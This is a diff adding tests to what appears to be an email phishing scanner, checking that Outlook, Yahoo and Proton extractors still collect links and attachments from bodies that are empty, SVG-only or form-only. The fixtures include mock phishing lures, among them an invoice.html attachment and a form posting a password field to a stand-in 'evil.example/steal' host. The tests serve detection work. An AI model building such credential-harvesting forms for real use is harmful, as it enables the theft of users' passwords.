@@ -120,3 +120,23 @@ describe('padding cannot push the real message out of scanning range', () => {
     expect(links.map((l) => l.href)).toContain('http://192.168.4.20/login');
   });
 });
+
+describe('bodies without text are still scanned', () => {
+  it('Outlook: an attachment-only email (empty body) is found and its attachment collected', () => {
+    document.body.innerHTML = `<div data-app-section="ConversationContainer"><div aria-label="Email message">
+      <span class="OZZZK">X &lt;x@evil.example&gt;</span><div aria-label="Message body"></div>
+      <div role="listitem" aria-label="Attached file invoice.html"><button>invoice.html</button></div></div></div>`;
+    const [e] = outlook.extractAll!(document);
+    expect(e).toBeDefined();
+    expect(e!.attachments?.map((a) => a.name).join(' ')).toContain('invoice.html');
+  });
+
+  it('Yahoo and Proton: SVG-only and form-only bodies are scanned', () => {
+    document.body.innerHTML = `<div data-test-id="message-card"><span data-test-id="message-from" title="x@evil.example">X</span>
+      <div data-test-id="message-view-body-content"><svg><a xlink:href="http://192.168.4.20/"><rect width="9" height="9"/></a></svg></div></div>`;
+    expect(yahoo.extractAll!(document)[0]!.links.map((l) => l.href)).toContain('http://192.168.4.20/');
+    document.body.innerHTML = `<article><span data-testid="message-header:from" title="x@evil.example">X</span>
+      <div data-testid="message-content:body"><form action="https://evil.example/steal"><input name="pw"></form></div></article>`;
+    expect(proton.extractAll!(document)[0]!.links.map((l) => l.href)).toContain('https://evil.example/steal');
+  });
+});
